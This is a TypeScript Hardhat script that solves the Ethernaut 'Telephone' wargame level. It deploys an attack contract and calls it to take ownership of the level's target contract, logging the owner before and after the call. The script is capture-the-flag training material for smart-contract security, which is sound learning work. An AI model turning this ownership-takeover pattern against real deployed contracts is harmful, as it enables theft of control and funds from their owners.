import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { createLevelInstance, getEthernautContract, submitLevelInstance } from './ethernaut'
import { deployContract } from './helpers'

const levelAddress = '0x0b6F6CE4BCfB70525A31454292017F640C10c768'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  // await loadOrDeployContract(
  //   'TelephoneAttack',
  //   ['0x0b6F6CE4BCfB70525A31454292017F640C10c768', await signer.getAddress()],
  //   signer,
  // )

  const ethernautContract = getEthernautContract(signer)
  const targetContract = await createLevelInstance('Telephone', levelAddress, signer)

  console.log(`Current target owner: ${await targetContract.owner()}`)

  const attackContract = await deployContract('TelephoneAttack', [], signer)

  const attackTx = await attackContract.attack(targetContract.address, await signer.getAddress())
  console.log(`Attack tx id: ${attackTx.hash}`)

  const attackRcpt = await attackTx.wait()
  console.log(`Attack receipt ${JSON.stringify(attackRcpt, null, 2)}`)

  console.log(`Current target owner: ${await targetContract.owner()}`)

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
